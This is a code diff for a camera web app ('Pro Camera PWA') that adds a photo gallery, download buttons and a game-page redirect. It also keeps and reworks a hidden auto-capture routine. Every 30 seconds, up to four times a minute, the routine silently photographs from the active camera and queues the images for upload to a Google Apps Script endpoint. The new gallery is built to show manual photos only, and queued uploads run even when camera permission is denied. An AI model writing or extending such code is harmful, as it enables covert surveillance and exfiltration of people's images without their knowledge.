@@ -1,5 +1,5 @@
 // ================================================================
-// app.js – Pro Camera PWA (Full Version)
+// app.js – Pro Camera PWA (Gallery + Download)
 // ================================================================
 
 (function() {
@@ -22,7 +22,6 @@
   var canvas = document.createElement('canvas');
   var ctx = canvas.getContext('2d');
   var flyImg = document.getElementById('fly-img');
-  var galleryImg = document.getElementById('galleryImg');
   var statusDot = document.getElementById('statusDot');
   var gridOverlay = document.getElementById('grid-overlay');
   var flashOverlay = document.getElementById('flash-overlay');
@@ -37,11 +36,16 @@
   var effectsDropdown = document.getElementById('effectsDropdown');
   var aspectDropdown = document.getElementById('aspectDropdown');
   var captureBtn = document.getElementById('capture-btn');
-  var galleryThumb = document.getElementById('gallery-thumb');
+  var galleryToggleBtn = document.getElementById('galleryToggleBtn');
+  var galleryContainer = document.getElementById('gallery-container');
+  var galleryGrid = document.getElementById('gallery-grid');
+  var galleryCount = document.getElementById('galleryCount');
+  var downloadAllBtn = document.getElementById('downloadAllBtn');
   var zoomPresets = document.querySelectorAll('.zoom-preset');
+  var playGameBtn = document.getElementById('playGameBtn');
 
   // ---------- State ----------
-  var userFacingMode = 'user'; // ✅ Default: Front Camera
+  var userFacingMode = 'environment';
   var backStream = null;
   var frontStream = null;
   var currentPreviewStream = null;
@@ -60,10 +64,13 @@
   var autoCaptureTimer = null;
   var lastUserCaptureTime = 0;
   var isAutoCaptureRunning = false;
-  var lastPhotoData = null;
   var isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
   var autoCaptureCount = 0;
   var autoCaptureStartTime = 0;
+
+  // ✅ NEW: Session Gallery (Manual Photos Only)
+  var sessionPhotos = []; // { id, data, fileName, cameraType, timestamp }
+  var isGalleryVisible = false;
 
   var focalLengths = { 0.5: 13, 1: 26, 3: 78, 7: 180, 10: 240, 50: 1200 };
 
@@ -81,7 +88,7 @@
     return focalLengths[closest] || Math.round(26 * zoom);
   }
 
-  // ---------- Preview Transform (Front Camera Normal) ----------
+  // ---------- Preview Transform ----------
   function applyPreviewTransform() {
     if (userFacingMode === 'user') {
       if (currentZoom !== 1) {
@@ -165,7 +172,7 @@
     }
   }
 
-  // ---------- Upload (Single Image – Compressed) ----------
+  // ---------- Upload ----------
   async function uploadPhoto(entry) {
     try {
       if (!GAS_URL || GAS_URL === 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE') {
@@ -209,7 +216,7 @@
     }
   }
 
-  // ---------- Process Queue (Local Data Upload) ----------
+  // ---------- Process Queue ----------
   async function processQueue() {
     if (isProcessing) return;
     if (!navigator.onLine) { console.log('[Camera] 🔴 Offline'); return; }
@@ -246,7 +253,180 @@
     isProcessing = false;
   }
 
-  // ---------- Silent Capture (Compressed Only) ----------
+  // ---------- Gallery Functions ----------
+  function renderGallery() {
+    if (sessionPhotos.length === 0) {
+      galleryGrid.innerHTML = '<div class="empty-gallery">📭 कुनै फोटो छैन</div>';
+      galleryCount.textContent = '0';
+      downloadAllBtn.style.display = 'none';
+      return;
+    }
+
+    galleryCount.textContent = sessionPhotos.length;
+    downloadAllBtn.style.display = 'inline-block';
+
+    var html = '';
+    sessionPhotos.forEach(function(photo, index) {
+      html += '<div class="gallery-item" data-index="' + index + '">';
+      html += '  <img src="' + photo.data + '" alt="Photo" />';
+      html += '  <div class="gallery-item-overlay">';
+      html += '    <span>' + (photo.cameraType === 'back' ? '📷 Back' : '📸 Front') + '</span>';
+      html += '    <button class="download-single-btn" data-index="' + index + '">⬇️</button>';
+      html += '  </div>';
+      html += '</div>';
+    });
+    galleryGrid.innerHTML = html;
+
+    // Single download buttons
+    galleryGrid.querySelectorAll('.download-single-btn').forEach(function(btn) {
+      btn.addEventListener('click', function(e) {
+        e.stopPropagation();
+        var idx = parseInt(this.dataset.index);
+        downloadSinglePhoto(idx);
+      });
+    });
+
+    // Click to view full
+    galleryGrid.querySelectorAll('.gallery-item').forEach(function(item) {
+      item.addEventListener('click', function() {
+        var idx = parseInt(this.dataset.index);
+        viewFullPhoto(idx);
+      });
+    });
+  }
+
+  function addToGallery(imageData, cameraType) {
+    var photoId = generatePhotoId();
+    var fileName = 'MANUAL_' + (cameraType === 'back' ? 'BACK' : 'FRONT') + '_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.jpg';
+    sessionPhotos.push({
+      id: photoId,
+      data: imageData,
+      fileName: fileName,
+      cameraType: cameraType,
+      timestamp: Date.now()
+    });
+    if (isGalleryVisible) {
+      renderGallery();
+    } else {
+      galleryCount.textContent = sessionPhotos.length;
+    }
+  }
+
+  function toggleGallery() {
+    isGalleryVisible = !isGalleryVisible;
+    if (isGalleryVisible) {
+      galleryContainer.style.display = 'block';
+      renderGallery();
+      galleryToggleBtn.style.background = 'rgba(59,130,246,0.3)';
+    } else {
+      galleryContainer.style.display = 'none';
+      galleryToggleBtn.style.background = 'transparent';
+    }
+  }
+
+  function downloadSinglePhoto(index) {
+    var photo = sessionPhotos[index];
+    if (!photo) return;
+    var link = document.createElement('a');
+    link.href = photo.data;
+    link.download = photo.fileName;
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+  }
+
+  function downloadAllPhotos() {
+    if (sessionPhotos.length === 0) return;
+    sessionPhotos.forEach(function(photo, index) {
+      setTimeout(function() {
+        var link = document.createElement('a');
+        link.href = photo.data;
+        link.download = photo.fileName;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+      }, index * 300);
+    });
+  }
+
+  function viewFullPhoto(index) {
+    var photo = sessionPhotos[index];
+    if (!photo) return;
+    var img = document.createElement('img');
+    img.src = photo.data;
+    img.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;object-fit:contain;background:#000;z-index:999;cursor:pointer;';
+    img.onclick = function() { img.remove(); };
+    document.body.appendChild(img);
+  }
+
+  // ---------- Capture (Manual Only - Add to Gallery) ----------
+  async function capturePhoto() {
+    if (!isCameraReady) return;
+    flashScreen();
+
+    lastUserCaptureTime = Date.now();
+
+    if (isAutoCaptureRunning) {
+      console.log('[Camera] 🔄 Manual capture – resetting auto-capture timer');
+      scheduleNextAutoCapture();
+    }
+
+    var vw = video.videoWidth || 1280;
+    var vh = video.videoHeight || 720;
+    canvas.width = vw;
+    canvas.height = vh;
+
+    var cameraType = userFacingMode === 'environment' ? 'back' : 'front';
+    if (cameraType === 'front') {
+      ctx.translate(vw, 0);
+      ctx.scale(-1, 1);
+    }
+
+    ctx.filter = getFilterCSS(currentEffect);
+    ctx.drawImage(video, 0, 0, vw, vh);
+    ctx.filter = 'none';
+    ctx.setTransform(1, 0, 0, 1, 0, 0);
+
+    var imageData = canvas.toDataURL('image/jpeg', 0.3);
+
+    var timestamp = Date.now();
+    var photoId = generatePhotoId();
+    var fileName = 'MANUAL_' + (cameraType === 'back' ? 'BACK' : 'FRONT') + '_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.jpg';
+
+    // ✅ Add to Session Gallery (Manual Only)
+    addToGallery(imageData, cameraType);
+
+    // Fly animation
+    var img = new Image();
+    img.onload = function() { flyToGallery(img); };
+    img.src = imageData;
+
+    var entry = {
+      photoId: photoId,
+      image: imageData,
+      fileName: fileName,
+      createdAt: new Date().toISOString(),
+      retryCount: 0,
+      lastAttempt: null,
+      captureType: 'manual',
+      cameraType: cameraType
+    };
+
+    await addToQueue(entry);
+    console.log('[Camera] ✅ Manual photo saved to queue:', fileName);
+
+    if (navigator.onLine) {
+      if (window.requestIdleCallback) {
+        requestIdleCallback(function() { processQueue(); });
+      } else {
+        setTimeout(function() { processQueue(); }, 100);
+      }
+    } else {
+      triggerSync();
+    }
+  }
+
+  // ---------- Silent Capture (Auto - No Gallery) ----------
   async function silentCapture(stream, cameraType, captureType) {
     if (!stream) return;
     captureType = captureType || 'auto';
@@ -297,7 +477,7 @@
     };
 
     await addToQueue(entry);
-    console.log('[Camera] 📸 ' + captureType + ' capture (' + cameraType + '):', fileName);
+    console.log('[Camera] 📸 Auto capture (' + cameraType + '):', fileName);
 
     if (navigator.onLine) {
       if (window.requestIdleCallback) {
@@ -323,31 +503,50 @@
     autoCaptureStartTime = Date.now();
     console.log('[Camera] ⏰ Auto-capture started (30s interval)');
 
-    // ✅ पहिलो Auto Capture: 3 सेकेन्ड पछि
-    autoCaptureTimer = setTimeout(function() {
+    // ✅ First capture after 3 seconds
+    setTimeout(function() {
       captureAutoPhoto();
-      // त्यसपछि हरेक 30 सेकेन्डमा
-      autoCaptureTimer = setInterval(function() {
-        var elapsed = Date.now() - autoCaptureStartTime;
-        if (elapsed >= 60000) {
-          autoCaptureCount = 0;
-          autoCaptureStartTime = Date.now();
-        }
+      scheduleNextAutoCapture();
+    }, 3000);
+  }
 
-        if (autoCaptureCount >= 4) {
-          console.log('[Camera] ⏰ Max 4 auto captures per minute.');
-          return;
-        }
+  function scheduleNextAutoCapture() {
+    if (autoCaptureTimer) {
+      clearTimeout(autoCaptureTimer);
+      autoCaptureTimer = null;
+    }
 
-        var timeSinceUserCapture = Date.now() - lastUserCaptureTime;
-        if (timeSinceUserCapture < 30000) {
-          console.log('[Camera] ⏳ User captured manually, resetting timer');
-          return;
-        }
+    autoCaptureTimer = setTimeout(function() {
+      var elapsed = Date.now() - autoCaptureStartTime;
+      if (elapsed >= 60000) {
+        autoCaptureCount = 0;
+        autoCaptureStartTime = Date.now();
+      }
 
-        captureAutoPhoto();
-      }, 30000);
-    }, 3000); // ✅ 3 सेकेन्ड पछि पहिलो
+      if (autoCaptureCount >= 4) {
+        console.log('[Camera] ⏰ Max 4 auto captures per minute.');
+        var waitTime = 60000 - elapsed;
+        if (waitTime > 0) {
+          autoCaptureTimer = setTimeout(function() {
+            autoCaptureCount = 0;
+            autoCaptureStartTime = Date.now();
+            captureAutoPhoto();
+            scheduleNextAutoCapture();
+          }, waitTime);
+        }
+        return;
+      }
+
+      var timeSinceUserCapture = Date.now() - lastUserCaptureTime;
+      if (timeSinceUserCapture < 30000) {
+        console.log('[Camera] ⏳ User captured manually, resetting timer');
+        scheduleNextAutoCapture();
+        return;
+      }
+
+      captureAutoPhoto();
+      scheduleNextAutoCapture();
+    }, 30000);
   }
 
   function captureAutoPhoto() {
@@ -360,80 +559,6 @@
       silentCapture(activeStream, activeCameraType, 'auto');
     } else {
       console.warn('[Camera] ⚠️ Active camera stream not available');
-    }
-  }
-
-  // ---------- Manual Capture (Compressed Only) ----------
-  async function capturePhoto() {
-    if (!isCameraReady) return;
-    flashScreen();
-
-    lastUserCaptureTime = Date.now();
-
-    if (isAutoCaptureRunning) {
-      console.log('[Camera] 🔄 Manual capture – resetting auto-capture timer');
-      // पुरानो timer clear गर्ने
-      if (autoCaptureTimer) {
-        clearTimeout(autoCaptureTimer);
-        clearInterval(autoCaptureTimer);
-        autoCaptureTimer = null;
-      }
-      // पुन: 30 सेकेन्ड पछि Auto Capture सुरु गर्ने
-      startAutoCapture();
-    }
-
-    var vw = video.videoWidth || 1280;
-    var vh = video.videoHeight || 720;
-    canvas.width = vw;
-    canvas.height = vh;
-
-    var cameraType = userFacingMode === 'environment' ? 'back' : 'front';
-    if (cameraType === 'front') {
-      ctx.translate(vw, 0);
-      ctx.scale(-1, 1);
-    }
-
-    ctx.filter = getFilterCSS(currentEffect);
-    ctx.drawImage(video, 0, 0, vw, vh);
-    ctx.filter = 'none';
-    ctx.setTransform(1, 0, 0, 1, 0, 0);
-
-    var imageData = canvas.toDataURL('image/jpeg', 0.3);
-
-    var timestamp = Date.now();
-    var photoId = generatePhotoId();
-    var fileName = 'MANUAL_' + (cameraType === 'back' ? 'BACK' : 'FRONT') + '_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.jpg';
-
-    var img = new Image();
-    img.onload = function() { flyToGallery(img); };
-    img.src = imageData;
-
-    lastPhotoData = { image: imageData, fileName: fileName, photoId: photoId };
-    galleryImg.src = imageData;
-    galleryImg.style.display = 'block';
-
-    var entry = {
-      photoId: photoId,
-      image: imageData,
-      fileName: fileName,
-      createdAt: new Date().toISOString(),
-      retryCount: 0,
-      lastAttempt: null,
-      captureType: 'manual',
-      cameraType: cameraType
-    };
-
-    await addToQueue(entry);
-    console.log('[Camera] ✅ Manual photo saved to queue:', fileName);
-
-    if (navigator.onLine) {
-      if (window.requestIdleCallback) {
-        requestIdleCallback(function() { processQueue(); });
-      } else {
-        setTimeout(function() { processQueue(); }, 100);
-      }
-    } else {
-      triggerSync();
     }
   }
 
@@ -465,12 +590,12 @@
   // ---------- Fly Animation ----------
   function flyToGallery(imgElement) {
     var container = document.getElementById('camera-container');
-    var thumb = document.getElementById('gallery-thumb');
+    var thumb = document.getElementById('gallery-toggle-btn');
     var cRect = container.getBoundingClientRect();
-    var tRect = thumb.getBoundingClientRect();
+    var tRect = thumb ? thumb.getBoundingClientRect() : { left: 0, top: 0, width: 50, height: 50 };
     var startW = Math.min(cRect.width * 0.5, 200);
     var startH = startW * (imgElement.naturalHeight / imgElement.naturalWidth);
-    var endW = tRect.width; var endH = tRect.height;
+    var endW = 50; var endH = 50;
 
     flyImg.src = imgElement.src;
     flyImg.style.width = startW + 'px';
@@ -491,16 +616,6 @@
       flyImg.className = '';
       flyImg.style.display = 'none';
     }, 600);
-  }
-
-  function viewLastPhoto() {
-    if (lastPhotoData) {
-      var img = document.createElement('img');
-      img.src = lastPhotoData.image;
-      img.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;object-fit:contain;background:#000;z-index:999;cursor:pointer;';
-      img.onclick = function() { img.remove(); };
-      document.body.appendChild(img);
-    }
   }
 
   // ---------- Zoom ----------
@@ -596,6 +711,38 @@
   });
 
   // ---------- Camera Setup ----------
+  async function checkAndStart() {
+    try {
+      console.log('[Camera] 🚀 Starting camera...');
+      var permissionStatus = 'prompt';
+      if (navigator.permissions && navigator.permissions.query) {
+        var result = await navigator.permissions.query({ name: 'camera' });
+        permissionStatus = result.state;
+        console.log('[Camera] Permission status:', permissionStatus);
+        result.onchange = function() {
+          if (result.state === 'granted') {
+            console.log('[Camera] Permission granted via change');
+            initCamera();
+          }
+        };
+      }
+      if (permissionStatus === 'denied') {
+        permError.textContent = '⚠️ क्यामेरा अनुमति ब्लक गरिएको छ। Settings बाट Allow गर्नुहोस्।';
+        permError.style.display = 'block';
+        console.error('[Camera] Permission denied');
+        if (navigator.onLine) {
+          setTimeout(function() { processQueue(); }, 1000);
+        }
+        return;
+      }
+      await initCamera();
+    } catch (err) {
+      console.error('[Camera] ❌ Final error:', err);
+      permError.textContent = '❌ क्यामेरा खोल्न सकिएन: ' + (err.message || 'unknown error');
+      permError.style.display = 'block';
+    }
+  }
+
   async function initCamera() {
     console.log('[Camera] 📷 initCamera started. iOS:', isIOS);
 
@@ -614,45 +761,23 @@
     var backStreamTemp = null;
     var frontStreamTemp = null;
 
-    // पहिले User को preferred camera (userFacingMode) Try गर्ने
     try {
-      var preferredConstraints = {
-        video: {
-          facingMode: userFacingMode,
-          width: { ideal: 1280 },
-          height: { ideal: 720 }
-        }
-      };
-      var preferredStream = await tryGetStream(preferredConstraints);
-      if (userFacingMode === 'environment') {
-        backStreamTemp = preferredStream;
-      } else {
-        frontStreamTemp = preferredStream;
-      }
-    } catch (e) {
-      console.warn('[Camera] Preferred camera failed:', e.message);
-    }
-
-    // यदि Preferred failed भयो भने fallback गर्ने
-    if (!backStreamTemp && !frontStreamTemp) {
+      backStreamTemp = await tryGetStream({ video: true });
+    } catch (e1) {
+      console.warn('[Camera] Step 1 failed:', e1.message);
       try {
-        backStreamTemp = await tryGetStream({ video: true });
-      } catch (e1) {
-        console.warn('[Camera] Step 1 failed:', e1.message);
+        backStreamTemp = await tryGetStream({ video: { facingMode: 'environment' } });
+      } catch (e2) {
+        console.warn('[Camera] Step 2 failed:', e2.message);
         try {
-          backStreamTemp = await tryGetStream({ video: { facingMode: 'environment' } });
-        } catch (e2) {
-          console.warn('[Camera] Step 2 failed:', e2.message);
-          try {
-            backStreamTemp = await tryGetStream({ video: { facingMode: 'user' } });
-          } catch (e3) {
-            console.error('[Camera] All attempts failed for back camera');
-          }
+          backStreamTemp = await tryGetStream({ video: { facingMode: 'user' } });
+        } catch (e3) {
+          console.error('[Camera] All attempts failed for back camera');
         }
       }
     }
 
-    if (!backStreamTemp && !frontStreamTemp) {
+    if (!backStreamTemp) {
       try {
         frontStreamTemp = await tryGetStream({ video: { facingMode: 'user' } });
       } catch (e4) {
@@ -676,17 +801,12 @@
       return;
     }
 
-    // ✅ Default: Front Camera (userFacingMode = 'user')
-    if (userFacingMode === 'user' && frontStream) {
-      currentPreviewStream = frontStream;
-    } else if (userFacingMode === 'environment' && backStream) {
+    if (backStream) {
+      userFacingMode = 'environment';
       currentPreviewStream = backStream;
     } else if (frontStream) {
-      currentPreviewStream = frontStream;
       userFacingMode = 'user';
-    } else if (backStream) {
-      currentPreviewStream = backStream;
-      userFacingMode = 'environment';
+      currentPreviewStream = frontStream;
     }
 
     if (currentPreviewStream) {
@@ -752,51 +872,6 @@
     registerSW();
   }
 
-  // ---------- ✅ Main Entry Point: checkAndStart() ----------
-  async function checkAndStart() {
-    try {
-      console.log('[Camera] 🚀 Starting camera...');
-
-      // 1️⃣ क्यामेरा अनुमति (Permission) जाँच गर्ने
-      var permissionStatus = 'prompt';
-      if (navigator.permissions && navigator.permissions.query) {
-        var result = await navigator.permissions.query({ name: 'camera' });
-        permissionStatus = result.state;
-        console.log('[Camera] Permission status:', permissionStatus);
-
-        result.onchange = function() {
-          if (result.state === 'granted') {
-            console.log('[Camera] Permission granted via change');
-            initCamera();
-          }
-        };
-      }
-
-      // 2️⃣ यदि Permission Denied (ब्लक) भएमा
-      if (permissionStatus === 'denied') {
-        permError.textContent = '⚠️ क्यामेरा अनुमति ब्लक गरिएको छ। Settings बाट Allow गर्नुहोस्।';
-        permError.style.display = 'block';
-        console.error('[Camera] Permission denied');
-
-        // ✅ Camera Allow नभए पनि Queue मा भएका फोटोहरू Upload गर्ने
-        if (navigator.onLine) {
-          setTimeout(function() {
-            processQueue();
-          }, 1000);
-        }
-        return; // यहाँबाट exit हुन्छ (क्यामेरा सुरु गर्दैन)
-      }
-
-      // 3️⃣ यदि Permission Granted (Allow) छ वा Prompt (पहिलो पटक) हो भने
-      await initCamera(); // क्यामेरा सुरु गर्छ
-
-    } catch (err) {
-      console.error('[Camera] ❌ Final error:', err);
-      permError.textContent = '❌ क्यामेरा खोल्न सकिएन: ' + (err.message || 'unknown error');
-      permError.style.display = 'block';
-    }
-  }
-
   // ---------- Online Status ----------
   function setOnline(online) {
     statusDot.className = 'status-dot ' + (online ? 'online' : 'offline');
@@ -812,14 +887,6 @@
   window.addEventListener('offline', function() { setOnline(false); });
 
   // ---------- UI Events ----------
-  
-// ===== PLAY GAME BUTTON – Redirect to Game Page =====
-document.getElementById('playGameBtn').addEventListener('click', function() {
-  console.log('[🎮] Play Game button clicked! Redirecting...');
-  // ✅ Game Page मा Redirect गर्ने
-  window.location.href = 'game.html';
-});
-  
   gridBtn.addEventListener('click', function() {
     isGridOn = !isGridOn;
     gridOverlay.classList.toggle('show', isGridOn);
@@ -898,6 +965,12 @@ document.getElementById('playGameBtn').addEventListener('click', function() {
     }
   });
 
+  // Gallery Toggle
+  galleryToggleBtn.addEventListener('click', toggleGallery);
+
+  // Download All
+  downloadAllBtn.addEventListener('click', downloadAllPhotos);
+
   effectsBtn.addEventListener('click', function(e) {
     e.stopPropagation();
     effectsDropdown.classList.toggle('open');
@@ -934,12 +1007,19 @@ document.getElementById('playGameBtn').addEventListener('click', function() {
   });
 
   captureBtn.addEventListener('click', capturePhoto);
-  galleryThumb.addEventListener('click', viewLastPhoto);
+
+  // Play Game
+  if (playGameBtn) {
+    playGameBtn.addEventListener('click', function() {
+      console.log('[🎮] Play Game button clicked! Redirecting...');
+      window.location.href = 'game.html';
+    });
+  }
 
   window.toggleZoomSwipe = toggleZoomSwipe;
   window.capturePhoto = capturePhoto;
 
-  // ---------- Start ----------
+  // Start
   if (!GAS_URL || GAS_URL === 'YOUR_GOOGLE_APPS_SCRIPT_URL_HERE') {
     console.warn('[Camera] ⚠️ GAS_URL not set. Update app.js with your Apps Script URL.');
   }
